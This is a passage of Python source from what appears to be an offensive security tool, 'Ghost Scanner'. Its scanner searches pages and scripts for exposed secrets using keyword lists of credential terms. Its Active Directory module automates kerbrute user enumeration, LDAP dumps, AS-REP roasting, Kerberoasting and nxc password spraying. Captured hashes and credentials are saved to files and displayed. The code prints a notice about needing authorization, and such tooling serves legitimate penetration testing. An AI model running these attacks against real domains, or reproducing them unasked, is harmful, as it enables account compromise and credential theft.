                           "modal", "tooltip", "dropdown", "breadcrumb",
                           "container", "wrapper", "section start", "section end",
                           "begin block", "end block", "content start", "content end")
                strong = ("password", "passwd", "secret", "api_key", "api-key",
                          "apikey", "private_key", "private-key", "access_key",
                          "access-key", "auth_token", "auth-token", "bearer ",
                          "credentials", "hardcoded", "backdoor", "do not commit")
                if any(u in low for u in ui_only) and not any(s in low for s in strong):
                    continue
            key = (label, value[:80].lower())
            if key in seen:
                continue
            seen.add(key)
            start = max(0, m.start() - 30)
            end = min(len(text), m.end() + 30)
            snippet = text[start:end].replace('\n', ' ').replace('\r', ' ')
            if len(snippet) > _SRC_SNIPPET_CHARS:
                snippet = snippet[:_SRC_SNIPPET_CHARS - 3] + '...'
            findings.append({
                "severity": severity,
                "type": label,
                "url": source_url,
                "value": value[:160],
                "snippet": snippet,
            })
            if len(findings) >= _SRC_MAX_FINDINGS_PER_FILE:
                return findings
    return findings


def analyze_source_code(target, session, urls=None, max_urls=120, max_assets=200):
    """Analyze the source code of discovered URLs looking for credentials and exposed data.

    Args:
        target: base URL (used to derive the domain).
        session: active requests.Session (authenticated if applicable).
        urls: iterable of URLs (spider sample). If None, only target is used.
        max_urls: maximum number of HTML pages to download.
        max_assets: maximum number of JS/JSON/MAP assets to download.

    Returns a dict with statistics and a list of findings.
    """
    base_netloc = urlparse(target).netloc
    seed_urls = list(urls) if urls else [target]
    if target not in seed_urls:
        seed_urls.insert(0, target)
    seed_urls = [u for u in seed_urls if urlparse(u).netloc == base_netloc][:max_urls]

    print_info(f"Analyzing source code of {len(seed_urls)} pages (max {max_urls})...")

    findings = []
    pages_analyzed = 0
    assets_to_scan = set()
    pages_iter = tqdm(seed_urls, desc="Pages", unit="pg", ncols=80,
                      disable=not HAS_TQDM) if HAS_TQDM else seed_urls

    for url in pages_iter:
        text, content_type, err = _download_text_capped(session, url)
        if text is None:
            continue
        pages_analyzed += 1
        if 'html' in (content_type or '').lower() or '<html' in text[:2000].lower():
            assets_to_scan.update(_extract_linked_assets(text, url, base_netloc))
        findings.extend(_scan_text_for_secrets(text, url))

    assets_list = list(assets_to_scan)[:max_assets]
    if assets_list:
        print_info(f"Analyzing {len(assets_list)} linked JS/JSON/MAP assets...")
    assets_iter = tqdm(assets_list, desc="Assets", unit="file", ncols=80,
                       disable=not HAS_TQDM) if HAS_TQDM else assets_list
    assets_analyzed = 0
    for asset_url in assets_iter:
        text, content_type, err = _download_text_capped(session, asset_url)
        if text is None:
            continue
        if not _is_source_text_response(content_type, asset_url):
            continue
        assets_analyzed += 1
        findings.extend(_scan_text_for_secrets(text, asset_url))

    seen = set()
    unique_findings = []
    for f in findings:
        key = (f["type"], (f.get("value") or "")[:80].lower(), f.get("url"))
        if key in seen:
            continue
        seen.add(key)
        unique_findings.append(f)

    sev_count = {"critical": 0, "high": 0, "medium": 0, "low": 0}
    for f in unique_findings:
        sev_count[f["severity"]] = sev_count.get(f["severity"], 0) + 1

    for f in unique_findings:
        if f["severity"] in ("critical", "high"):
            FINDINGS.append(
                f"[CODE:{f['severity'].upper()}] {f['type']} in {f['url']} "
                f"— value: {f['value']}"
            )

    if unique_findings:
        print_good(
            f"Source code analysis completed: {len(unique_findings)} findings "
            f"(C:{sev_count.get('critical',0)} H:{sev_count.get('high',0)} "
            f"M:{sev_count.get('medium',0)} L:{sev_count.get('low',0)}) "
            f"across {pages_analyzed} pages + {assets_analyzed} assets."
        )
        SEV_ORDER = {'critical': 0, 'high': 1, 'medium': 2, 'low': 3}
        SEV_COLOR = {
            'critical': Fore.MAGENTA, 'high': Fore.RED,
            'medium': Fore.YELLOW,   'low': Fore.CYAN,
        }
        sorted_findings = sorted(
            unique_findings,
            key=lambda x: (SEV_ORDER.get(x.get('severity', 'low'), 99),
                           x.get('type', ''), x.get('url', ''))
        )
        shown = sorted_findings[:50]
        rows = []
        for f in shown:
            sev = f.get('severity', 'low')
            color = SEV_COLOR.get(sev, Fore.WHITE)
            tipo = (f.get('type') or '-')[:30]
            url = f.get('url') or '-'
            if len(url) > 60:
                url = url[:57] + '...'
            value = (f.get('value') or '-').replace('\n', ' ').replace('\r', ' ')
            if len(value) > 50:
                value = value[:47] + '...'
            rows.append([
                f"{color}{sev.upper()}{Style.RESET_ALL}",
                tipo, url, value,
            ])
        if len(unique_findings) <= 50:
            title = f"Source code analysis findings ({len(unique_findings)}):"
        else:
            title = f"Source code analysis findings (top 50 of {len(unique_findings)}):"
        print_table(
            headers=["SEVERITY", "TYPE", "URL", "VALUE"],
            rows=rows,
            alignments=['<', '<', '<', '<'],
            title=title,
        )
    else:
        print_info(
            f"Source code analysis completed with no findings "
            f"({pages_analyzed} pages, {assets_analyzed} assets)."
        )

    return {
        "pages_analyzed": pages_analyzed,
        "assets_analyzed": assets_analyzed,
        "total_findings": len(unique_findings),
        "summary": sev_count,
        "findings": unique_findings,
    }

def check_kerbrute():
    return shutil.which("kerbrute")

def check_ldapsearch():
    return shutil.which("ldapsearch")

def check_nxc():
    return shutil.which("nxc") or shutil.which("netexec")

def check_impacket_getnpusers():
    return shutil.which("impacket-GetNPUsers")

def check_impacket_getuserspns():
    return shutil.which("impacket-GetUserSPNs")

def _domain_to_base_dn(domain):
    parts = [p.strip() for p in (domain or "").split(".") if p.strip()]
    return ",".join(f"DC={p}" for p in parts)

def _default_ad_user_wordlist():
    for path in (SECLISTS_USERS_SHORT, SECLISTS_USERS):
        if os.path.isfile(path):
            return path
    return None

def _default_ad_password_wordlist():
    for path in (SECLISTS_PASSWORDS, ROCKYOU_WORDLIST):
        if os.path.isfile(path):
            return path
    return None

def _strip_ansi(text):
    return re.sub(r'\x1b\[[0-9;]*[A-Za-z]', '', text or "")

def _format_ad_command(cmd, secrets=None):
    secrets = [s for s in (secrets or []) if s]
    visible = []
    hide_next = False
    for part in cmd:
        if hide_next:
            visible.append("***")
            hide_next = False
            continue
        if part in ("-p", "--password", "-w"):
            visible.append(part)
            hide_next = True
            continue
        value = str(part)
        for secret in secrets:
            value = value.replace(secret, "***")
        visible.append(value)
    return " ".join(f'"{p}"' if " " in str(p) else str(p) for p in visible)

def _run_ad_command(cmd, label, timeout=300, secrets=None):
    visible = _format_ad_command(cmd, secrets=secrets)
    print_info(f"Running {label}: {visible}")
    started = time.time()
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        output = _strip_ansi((proc.stdout or "") + (proc.stderr or ""))
        if output.strip():
            preview = output if len(output) <= 6000 else output[:6000] + "\n...[output truncated in console, full in report]..."
            print(preview)
        return {
            "label": label,
            "command": visible,
            "returncode": proc.returncode,
            "duration_seconds": round(time.time() - started, 2),
            "output": output,
        }
    except subprocess.TimeoutExpired as e:
        output = _strip_ansi((e.stdout or "") + (e.stderr or ""))
        print_error(f"{label} exceeded the {timeout}s timeout.")
        return {
            "label": label,
            "command": visible,
            "returncode": None,
            "duration_seconds": round(time.time() - started, 2),
            "error": "timeout",
            "output": output,
        }
    except KeyboardInterrupt:
        print_warning(f"{label} interrupted by user.")
        return {
            "label": label,
            "command": visible,
            "returncode": None,
            "duration_seconds": round(time.time() - started, 2),
            "error": "interrupted",
            "output": "",
        }
    except Exception as e:
        print_error(f"Error running {label}: {e}")
        return {
            "label": label,
            "command": visible,
            "returncode": None,
            "duration_seconds": round(time.time() - started, 2),
            "error": str(e),
            "output": "",
        }

def _parse_kerbrute_users(output, domain=""):
    users = set()
    for line in _strip_ansi(output).splitlines():
        m = re.search(r'VALID\s+(?:USERNAME|LOGIN)\s*:?\s+([^\s]+)', line, re.IGNORECASE)
        if not m and "[+]" in line and "@" in line:
            m = re.search(r'([A-Za-z0-9_.+\-]+@[\w.\-]+)', line)
        if not m:
            continue
        user = m.group(1).strip()
        if domain and user.lower().endswith("@" + domain.lower()):
            user = user[:-(len(domain) + 1)]
        users.add(user)
    return sorted(users)

def _parse_ldif_entries(output):
    entries = []
    current = {}
    last_key = None
    for raw in _strip_ansi(output).splitlines():
        if not raw or raw.startswith("#"):
            if current:
                entries.append(current)
                current = {}
                last_key = None
            continue
        if raw.startswith(" ") and last_key:
            current[last_key][-1] += raw[1:]
            continue
        if ":" not in raw:
            continue
        key, value = raw.split(":", 1)
        key = key.strip()
        value = value.strip()
        if key.endswith(":"):
            key = key[:-1].strip()
        current.setdefault(key, []).append(value)
        last_key = key
    if current:
        entries.append(current)
    return entries

def _first_attr(entry, *names):
    for name in names:
        values = entry.get(name) or []
        if values:
            return values[0]
    return ""

def _normalize_ldap_users(entries):
    users = []
    seen = set()
    for entry in entries:
        username = _first_attr(entry, "sAMAccountName", "uid", "userPrincipalName")
        if not username or username.endswith("$") or username in seen:
            continue
        seen.add(username)
        users.append({
            "username": username,
            "upn": _first_attr(entry, "userPrincipalName"),
            "cn": _first_attr(entry, "cn", "displayName"),
            "memberOf": entry.get("memberOf", []),
            "userAccountControl": _first_attr(entry, "userAccountControl"),
            "pwdLastSet": _first_attr(entry, "pwdLastSet"),
            "lastLogonTimestamp": _first_attr(entry, "lastLogonTimestamp"),
        })
    return users

def _normalize_ldap_groups(entries):
    groups = []
    seen = set()
    for entry in entries:
        name = _first_attr(entry, "cn", "sAMAccountName")
        if not name or name in seen:
            continue
        seen.add(name)
        groups.append({
            "name": name,
            "description": _first_attr(entry, "description"),
            "members": entry.get("member", []),
        })
    return groups

def _normalize_ldap_computers(entries):
    computers = []
    seen = set()
    for entry in entries:
        name = _first_attr(entry, "dNSHostName", "sAMAccountName", "cn")
        if not name or name in seen:
            continue
        seen.add(name)
        computers.append({
            "name": name,
            "os": _first_attr(entry, "operatingSystem"),
            "os_version": _first_attr(entry, "operatingSystemVersion"),
            "lastLogonTimestamp": _first_attr(entry, "lastLogonTimestamp"),
        })
    return computers

def _parse_nxc_credentials(output):
    creds = []
    seen = set()
    for line in _strip_ansi(output).splitlines():
        if "[+]" not in line:
            continue
        m = re.search(r'\[\+\]\s+((?:[^\\\s]+\\)?[^:\s]+):([^\s]+)', line)
        if not m:
            continue
        user = m.group(1)
        pwd = m.group(2)
        key = (user, pwd)
        if key in seen:
            continue
        seen.add(key)
        creds.append({"username": user, "password": pwd, "source": "nxc"})
    return creds

def _ad_artifact_dir(domain, dc):
    safe = re.sub(r'[^A-Za-z0-9_.-]+', '_', f"{domain}_{dc}").strip("_") or "active_directory"
    out_dir = os.path.join(os.getcwd(), "reports", "active_directory", safe)
    os.makedirs(out_dir, exist_ok=True)
    return out_dir

def _write_ad_user_file(users, domain, dc, filename="valid-users.txt"):
    clean = []
    seen = set()
    for user in users or []:
        value = str(user or "").strip()
        if not value:
            continue
        if "@" in value and domain and value.lower().endswith("@" + domain.lower()):
            value = value[:-(len(domain) + 1)]
        if "\\" in value:
            value = value.split("\\", 1)[1]
        if value in seen:
            continue
        seen.add(value)
        clean.append(value)
    if not clean:
        return None
    path = os.path.join(_ad_artifact_dir(domain, dc), filename)
    with open(path, "w", encoding="utf-8") as f:
        for user in clean:
            f.write(user + "\n")
    return path

def _read_hash_lines(path=None, output=""):
    lines = []
    if path and os.path.isfile(path):
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines.extend([line.strip() for line in f if line.strip()])
        except Exception:
            pass
    for line in (output or "").splitlines():
        line = line.strip()
        if line.startswith("$krb5"):
            lines.append(line)
    seen = set()
    unique = []
    for line in lines:
        if line in seen:
            continue
        seen.add(line)
        unique.append(line)
    return unique

def _parse_kerberos_hash_user(hash_line):
    if hash_line.startswith("$krb5asrep$"):
        m = re.search(r'\$krb5asrep\$\d+\$([^:@$]+)', hash_line, re.IGNORECASE)
        return m.group(1) if m else ""
    if hash_line.startswith("$krb5tgs$"):
        m = re.search(r'\$krb5tgs\$\d+\$\*?([^$*]+)', hash_line, re.IGNORECASE)
        return m.group(1) if m else ""
    return ""

def _normalize_kerberos_hashes(hash_lines, roast_type):
    hashes = []
    for line in hash_lines:
        hashes.append({
            "type": roast_type,
            "username": _parse_kerberos_hash_user(line),
            "hash": line,
        })
    return hashes

def run_active_directory_pentest(target=None):
    print_phase("ACTIVE DIRECTORY PENTESTING")
    print_warning("Run this module only with explicit authorization over the target domain/AD.")
    parsed = urlparse(target or TARGET_URL or "")
    default_dc = parsed.hostname or ""
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Domain Controller IP/FQDN [{default_dc}]:")
    dc = input("> ").strip() or default_dc
    if not dc:
        print_error("Domain Controller required.")
        return None
    suggested_domain = ".".join((dc.split(".")[1:] if "." in dc else []))
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} AD domain FQDN [{suggested_domain}]:")
    domain = input("> ").strip() or suggested_domain
    if not domain:
        print_error("Domain required for Kerberos/LDAP/NXC.")
        return None
    base_dn = _domain_to_base_dn(domain)
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} LDAP Base DN [{base_dn}]:")
    base_dn = input("> ").strip() or base_dn

    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Domain user to enumerate (empty = anonymous/guest):")
    username = input("> ").strip()
    password = ""
    if username:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Password for {username}:")
        password = getpass.getpass("> ")
    auth_mode = "authenticated" if username else "anonymous"

    result = {
        "target": dc,
        "domain": domain,
        "base_dn": base_dn,
        "auth_mode": auth_mode,
        "username": username,
        "tools": {
            "kerbrute": bool(check_kerbrute()),
            "ldapsearch": bool(check_ldapsearch()),
            "nxc": bool(check_nxc()),
            "impacket-GetNPUsers": bool(check_impacket_getnpusers()),
            "impacket-GetUserSPNs": bool(check_impacket_getuserspns()),
        },
        "kerbrute": {},
        "impacket": {
            "asrep_roast": {"attempted": False, "hashes": []},
            "kerberoast": {"attempted": False, "hashes": []},
        },
        "artifacts": {},
        "ldap": {"users": [], "groups": [], "computers": [], "commands": []},
        "nxc": {"enum": {}, "bruteforce": {"attempted": False, "credentials": []}},
        "raw_commands": [],
    }

    def _adtrim(value, width=80):
        text = str(value if value is not None else "-")
        return text if len(text) <= width else text[: width - 1] + "…"

    if not any(result["tools"].values()):
        print_warning("kerbrute, ldapsearch or nxc/netexec not found in PATH.")
        print_warning("On Kali you can install/update AD tools from apt or official repos.")

    ad_user_wordlist = None
    kerbrute_path = check_kerbrute()
    if kerbrute_path:
        default_users = _default_ad_user_wordlist()
        prompt_default = default_users or "no default"
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Username wordlist for kerbrute userenum [{prompt_default}] (empty = skip):")
        user_wl = input_path("> ").strip() or default_users
        ad_user_wordlist = user_wl if user_wl and os.path.isfile(user_wl) else None
        if ad_user_wordlist:
            cmd = [kerbrute_path, "userenum", "--dc", dc, "-d", domain, ad_user_wordlist]
            run = _run_ad_command(cmd, "kerbrute userenum", timeout=900)
            valid_users = _parse_kerbrute_users(run.get("output", ""), domain=domain)
            result["kerbrute"] = {
                "command": run.get("command"),
                "returncode": run.get("returncode"),
                "valid_users": valid_users,
                "output": run.get("output", ""),
            }
            result["raw_commands"].append(run)
            for user in valid_users:
                _append_finding_once(f"[AD:USER] {user}")
            if valid_users:
                print_table(
                    headers=["#", "Valid user (Kerbrute)"],
                    rows=[[str(i), _adtrim(u, 60)] for i, u in enumerate(valid_users, 1)],
                    alignments=['>', '<'],
                    title=f"Kerbrute — valid users ({len(valid_users)}):",
                    border_color=Fore.GREEN,
                )
        elif user_wl:
            print_warning(f"Could not read the username wordlist: {user_wl}")
    else:
        print_warning("kerbrute is not installed or not in PATH. Skipping Kerberos userenum.")

    ldap_path = check_ldapsearch()
    if ldap_path:
        ldap_base = [ldap_path, "-x", "-LLL", "-H", f"ldap://{dc}"]
        if username:
            bind_user = username if "@" in username or "\\" in username else f"{username}@{domain}"
            ldap_base += ["-D", bind_user, "-w", password]
        ldap_queries = [
            ("users", "(&(objectCategory=person)(objectClass=user))",
             ["sAMAccountName", "userPrincipalName", "cn", "displayName", "memberOf", "userAccountControl", "pwdLastSet", "lastLogonTimestamp"]),
            ("groups", "(objectClass=group)", ["cn", "description", "member"]),
            ("computers", "(objectClass=computer)", ["dNSHostName", "sAMAccountName", "operatingSystem", "operatingSystemVersion", "lastLogonTimestamp"]),
        ]
        for label, ldap_filter, attrs in ldap_queries:
            cmd = ldap_base + ["-b", base_dn, ldap_filter] + attrs
            run = _run_ad_command(cmd, f"ldapsearch {label}", timeout=420, secrets=[password])
            entries = _parse_ldif_entries(run.get("output", ""))
            if label == "users":
                result["ldap"]["users"] = _normalize_ldap_users(entries)
                for user in result["ldap"]["users"]:
                    _append_finding_once(f"[AD:LDAP:USER] {user.get('username')}")
                ldap_users_now = result["ldap"]["users"]
                if ldap_users_now:
                    print_table(
                        headers=["User", "Name", "UPN"],
                        rows=[[_adtrim(u.get("username") or "-", 30),
                               _adtrim(u.get("cn") or "-", 35),
                               _adtrim(u.get("upn") or "-", 45)] for u in ldap_users_now[:30]],
                        alignments=['<', '<', '<'],
                        title=f"LDAP — users ({len(ldap_users_now)}):",
                    )
            elif label == "groups":
                result["ldap"]["groups"] = _normalize_ldap_groups(entries)
                ldap_groups_now = result["ldap"]["groups"]
                if ldap_groups_now:
                    print_table(
                        headers=["Group", "Description", "Members"],
                        rows=[[_adtrim(g.get("name") or "-", 35),
                               _adtrim(g.get("description") or "-", 45),
                               str(len(g.get("members") or []))] for g in ldap_groups_now[:30]],
                        alignments=['<', '<', '>'],
                        title=f"LDAP — groups ({len(ldap_groups_now)}):",
                    )
            elif label == "computers":
                result["ldap"]["computers"] = _normalize_ldap_computers(entries)
                ldap_computers_now = result["ldap"]["computers"]
                if ldap_computers_now:
                    print_table(
                        headers=["Computer", "Operating system", "Version"],
                        rows=[[_adtrim(c.get("name") or "-", 40),
                               _adtrim(c.get("os") or "-", 35),
                               _adtrim(c.get("os_version") or "-", 18)] for c in ldap_computers_now[:30]],
                        alignments=['<', '<', '<'],
                        title=f"LDAP — computers ({len(ldap_computers_now)}):",
                    )
            command_data = {
                "label": run.get("label"),
                "command": run.get("command"),
                "returncode": run.get("returncode"),
                "output": run.get("output", ""),
            }
            result["ldap"]["commands"].append(command_data)
            result["raw_commands"].append(run)
    else:
        print_warning("ldapsearch is not installed or not in PATH. Skipping LDAP.")

    discovered_users = []
    discovered_users.extend(result.get("kerbrute", {}).get("valid_users") or [])
    discovered_users.extend([u.get("username") for u in result.get("ldap", {}).get("users", []) if isinstance(u, dict)])
    valid_users_file = _write_ad_user_file(discovered_users, domain, dc)
    if valid_users_file:
        result["artifacts"]["valid_users_file"] = valid_users_file
        print_good(f"Valid users saved for roasting: {valid_users_file}")

    getnp_path = check_impacket_getnpusers()
    if getnp_path:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run AS-REP Roasting with impacket-GetNPUsers? [Y/n]:")
        do_asrep = input("> ").strip().lower() != 'n'
        if do_asrep:
            usersfile = valid_users_file
            if not usersfile:
                default_usersfile = ad_user_wordlist or _default_ad_user_wordlist() or ""
                print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} usersfile path for AS-REP [{default_usersfile or 'required'}]:")
                usersfile = input_path("> ").strip() or default_usersfile
            if not usersfile or not os.path.isfile(usersfile):
                print_warning("AS-REP Roasting requires a readable usersfile.")
            else:
                out_file = os.path.join(_ad_artifact_dir(domain, dc), "asrep_hashes.txt")
                cmd = [
                    getnp_path,
                    f"{domain}/",
                    "-usersfile", usersfile,
                    "-dc-ip", dc,
                    "-format", "hashcat",
                    "-outputfile", out_file,
                ]
                run = _run_ad_command(cmd, "impacket-GetNPUsers AS-REP", timeout=900)
                hashes = _normalize_kerberos_hashes(
                    _read_hash_lines(out_file, run.get("output", "")),
                    "asrep",
                )
                result["impacket"]["asrep_roast"] = {
                    "attempted": True,
                    "command": run.get("command"),
                    "returncode": run.get("returncode"),
                    "output_file": out_file,
                    "hashes": hashes,
                    "output": run.get("output", ""),
                }
                result["raw_commands"].append(run)
                if hashes:
                    print_good(f"AS-REP Roasting: {len(hashes)} hash(es) captured.")
                    print_table(
                        headers=["User", "Hash AS-REP"],
                        rows=[[_adtrim(h.get("username") or "-", 28), _adtrim(h.get("hash") or "-", 90)] for h in hashes[:20]],
                        alignments=['<', '<'],
                        title=f"AS-REP Roasting ({len(hashes)}):",
                        border_color=Fore.YELLOW,
                    )
                for item in hashes:
                    _append_finding_once(f"[AD:ASREP] {item.get('username') or 'user'} AS-REP roastable hash")
    else:
        print_warning("impacket-GetNPUsers is not installed or not in PATH. Skipping AS-REP Roasting.")

    getspns_path = check_impacket_getuserspns()
    if getspns_path:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run Kerberoasting with impacket-GetUserSPNs? [Y/n]:")
        do_kerberoast = input("> ").strip().lower() != 'n'
        if do_kerberoast:
            if not username or not password:
                print_warning("Kerberoasting with GetUserSPNs requires domain credentials. Skipping.")
            else:
                roast_user = username
                if "\\" in roast_user:
                    roast_user = roast_user.split("\\", 1)[1]
                if "@" in roast_user:
                    roast_user = roast_user.split("@", 1)[0]
                out_file = os.path.join(_ad_artifact_dir(domain, dc), "kerberoast_hashes.txt")
                cmd = [
                    getspns_path,
                    f"{domain}/{roast_user}:{password}",
                    "-dc-ip", dc,
                    "-request",
                    "-outputfile", out_file,
                ]
                run = _run_ad_command(cmd, "impacket-GetUserSPNs Kerberoast", timeout=900, secrets=[password])
                hashes = _normalize_kerberos_hashes(
                    _read_hash_lines(out_file, run.get("output", "")),
                    "kerberoast",
                )
                result["impacket"]["kerberoast"] = {
                    "attempted": True,
                    "command": run.get("command"),
                    "returncode": run.get("returncode"),
                    "output_file": out_file,
                    "hashes": hashes,
                    "output": run.get("output", ""),
                }
                result["raw_commands"].append(run)
                if hashes:
                    print_good(f"Kerberoasting: {len(hashes)} TGS hash(es) captured.")
                    print_table(
                        headers=["User/SPN", "Hash TGS"],
                        rows=[[_adtrim(h.get("username") or "-", 28), _adtrim(h.get("hash") or "-", 90)] for h in hashes[:20]],
                        alignments=['<', '<'],
                        title=f"Kerberoasting ({len(hashes)}):",
                        border_color=Fore.YELLOW,
                    )
                for item in hashes:
                    _append_finding_once(f"[AD:KERBEROAST] {item.get('username') or 'user'} Kerberoastable SPN")
    else:
        print_warning("impacket-GetUserSPNs is not installed or not in PATH. Skipping Kerberoasting.")

    nxc_path = check_nxc()
    if nxc_path:
        nxc_base = [nxc_path, "smb", dc, "-d", domain]
        if username:
            nxc_base += ["-u", username, "-p", password]
        else:
            nxc_base += ["-u", "", "-p", ""]
        enum_cmd = nxc_base + ["--users", "--groups", "--shares", "--pass-pol"]
        run = _run_ad_command(enum_cmd, "nxc smb enum", timeout=600, secrets=[password])
        result["nxc"]["enum"] = {
            "command": run.get("command"),
            "returncode": run.get("returncode"),
            "output": run.get("output", ""),
        }
        result["raw_commands"].append(run)

        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Run brute force/password spray with nxc? [y/N]:")
        brute = input("> ").strip().lower() in ('s', 'y')
        if brute:
            default_users = _default_ad_user_wordlist()
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} User or userlist path [{username or default_users or 'required'}]:")
            nxc_users = input_path("> ").strip() or username or default_users
            default_pass = _default_ad_password_wordlist()
            print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Password or passlist path [{default_pass or 'required'}]:")
            nxc_pass = input_path("> ").strip() or default_pass
            if not nxc_users or not nxc_pass:
                print_warning("User/userlist and password/passlist are required for nxc bruteforce.")
            else:
                brute_cmd = [
                    nxc_path, "smb", dc, "-d", domain,
                    "-u", nxc_users, "-p", nxc_pass,
                    "--continue-on-success",
                ]
                run_brute = _run_ad_command(
                    brute_cmd,
                    "nxc smb bruteforce",
                    timeout=1800,
                    secrets=[password, nxc_pass if not os.path.isfile(nxc_pass) else ""],
                )
                creds = _parse_nxc_credentials(run_brute.get("output", ""))
                result["nxc"]["bruteforce"] = {
                    "attempted": True,
                    "command": run_brute.get("command"),
                    "returncode": run_brute.get("returncode"),
                    "credentials": creds,
                    "output": run_brute.get("output", ""),
                }
                result["raw_commands"].append(run_brute)
                for cred in creds:
                    _append_finding_once(f"[AD:CRED] {cred.get('username')}:{cred.get('password')}")
                if creds:
                    print_table(
                        headers=["User", "Password"],
                        rows=[[f"{Fore.GREEN}{_adtrim(c.get('username') or '-', 40)}{Style.RESET_ALL}",
                               f"{Fore.GREEN}{_adtrim(c.get('password') or '-', 40)}{Style.RESET_ALL}"] for c in creds],
                        alignments=['<', '<'],
                        title=f"NXC — valid credentials ({len(creds)}):",
                        border_color=Fore.GREEN,
                    )
    else:
        print_warning("nxc/netexec is not installed or not in PATH. Skipping SMB/NXC.")

    ldap_users = result["ldap"].get("users", [])
    ldap_groups = result["ldap"].get("groups", [])
    ldap_computers = result["ldap"].get("computers", [])
    kb_users = result.get("kerbrute", {}).get("valid_users", [])
    nxc_creds = result.get("nxc", {}).get("bruteforce", {}).get("credentials", [])
    asrep_hashes = result.get("impacket", {}).get("asrep_roast", {}).get("hashes", [])
    kerberoast_hashes = result.get("impacket", {}).get("kerberoast", {}).get("hashes", [])
    print_table(
        headers=["Source", "Total"],
        rows=[
            ["Kerbrute valid users", str(len(kb_users))],
            ["AS-REP roastable", str(len(asrep_hashes))],
            ["Kerberoastable SPNs", str(len(kerberoast_hashes))],
            ["LDAP users", str(len(ldap_users))],
            ["LDAP groups", str(len(ldap_groups))],
            ["LDAP computers", str(len(ldap_computers))],
            ["NXC credentials", str(len(nxc_creds))],
        ],
        alignments=['<', '>'],
        title="Active Directory Summary:",
    )
    SCAN_DATA["active_directory"] = result
    return result

def _has_scan_data():
    """True if at least one module has been executed and there is data to report."""
    return any([
        bool(FINDINGS),
        bool(SCAN_DATA.get("general")),
        bool(SCAN_DATA.get("injection")),
        bool(SCAN_DATA.get("api_endpoints")),
        bool(SCAN_DATA.get("vhosts")),
        bool(SCAN_DATA.get("directory_hits")),
        bool(SCAN_DATA.get("users")),
        bool(SCAN_DATA.get("emails")),
        bool(SCAN_DATA.get("bruteforce_credentials")),
        bool(SCAN_DATA.get("wordpress")),
        bool(SCAN_DATA.get("active_directory")),
        bool(SCAN_DATA.get("spider")),
        bool(SCAN_DATA.get("nuclei_findings")),
        bool((SCAN_DATA.get("source_code_analysis") or {}).get("findings")),
        bool((SCAN_DATA.get("nmap") or {}).get("ports")),
    ])

def show_menu():
    clear_screen()
    if HAS_COLOR:
        print(Fore.CYAN + BANNER + Style.RESET_ALL)
        print(Fore.CYAN + DESCRIPTION + Style.RESET_ALL)
        print(Fore.GREEN + DEVELOPER + Style.RESET_ALL + "\n")
    else:
        print(BANNER)
        print(DESCRIPTION)
        print(DEVELOPER + "\n")
    auth_status = (f"{Fore.GREEN}[Authenticated]{Style.RESET_ALL}" if AUTHENTICATED
                   else f"{Fore.YELLOW}[Not authenticated]{Style.RESET_ALL}")
    print("=" * 52)
    print(f"  GHOST SCANNER v{VERSION}  {auth_status}")
    print("=" * 52)
    print(" 1. Configure authentication (login)")
    print(" 2. General information & enumeration")
    print(" 3. Port scan with Nmap (-sV + targeted NSE)")
    print(" 4. Vulnerability analysis with Nuclei")
    print(" 5. Subdomain fuzzing (vhost) with ffuf")
    print(" 6. Directory fuzzing (uses ffuf if installed)")
    print(" 7. Spidering / Full site mapping")
    print(" 8. Source code analysis (credentials/secrets in HTML & JS)")
    print(" 9. Injection tests (SQLi, XSS, Path Traversal, Command Injection)")
    print("10. API tests (discovery, IDOR, mass assignment)")
    print("11. User/email enumeration & password brute force")
    print("12. WordPress enumeration & attacks (WPScan)")
    print("13. Active Directory pentesting (Kerbrute/LDAP/NXC)")
    print("14. FULL PENTEST (runs all tests above)")
    if _has_scan_data():
        print("15. Show Markdown summary")
        print("16. Show result tables (visual format)")
    print("17. Exit")
    print("="*50)

def run_information_gathering(target, session):
    print_phase("GATHERING GENERAL INFORMATION")
    info = safe_execute(gather_info, target, session)
    if info:
        SCAN_DATA["general"] = {
            "status_code": info.get("status_code"),
            "server": info.get("server"),
            "technologies": info.get("technologies", []),
            "technologies_source": info.get("technologies_source", "unknown"),
            "headers": info.get("headers", {}),
            "cookies": [c.name for c in info.get("cookies", [])],
        }
        print_info(f"Server: {info['server']}")
        robots_paths = safe_execute(check_robots_sitemap, target, session) or []
        http_methods = safe_execute(check_http_methods, target, session) or []
        SCAN_DATA["robots_paths"] = robots_paths
        SCAN_DATA["http_methods"] = list(set(http_methods))
        safe_execute(check_security_headers, info['headers'])
        safe_execute(check_cookie_security, info['cookies'])
        resp = safe_execute(session.get, target, timeout=DEFAULT_TIMEOUT)
        if resp:
            safe_execute(check_info_disclosure, resp.text)
        safe_execute(check_directory_listing, target, session)
        safe_execute(check_ssl_tls, target)
        safe_execute(test_cors_advanced, target, session)

def run_vhost_fuzzing(target, session):
    print_phase("SUBDOMAIN FUZZING (VHOST)")
    parsed = urlparse(target)
    host = parsed.hostname or ""
    is_ip = bool(re.match(r'^\d{1,3}(\.\d{1,3}){3}$', host))
    if is_ip:
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Base domain (e.g. planning.htb) — required when the target is an IP:")
        base_domain = input("> ").strip()
    else:
        default = host
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Base domain [{default}]:")
        base_in = input("> ").strip()
        base_domain = base_in or default
    if not base_domain:
        print_error("Base domain required. Skipping vhost fuzzing.")
        return
    print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use default wordlist (SecLists DNS/namelist.txt)? [Y/n]:")
    use_default = input("> ").strip().lower()
    wordlist = None
    if use_default == 'n':
        custom_wl = input_path("Path to custom wordlist: ").strip()
        if custom_wl:
            wordlist = custom_wl
    if check_ffuf():
        print(f"{Fore.YELLOW}[?]{Style.RESET_ALL} Use ffuf? (recommended) [Y/n]:")
        use_ffuf = input("> ").strip().lower() != 'n'
    else:
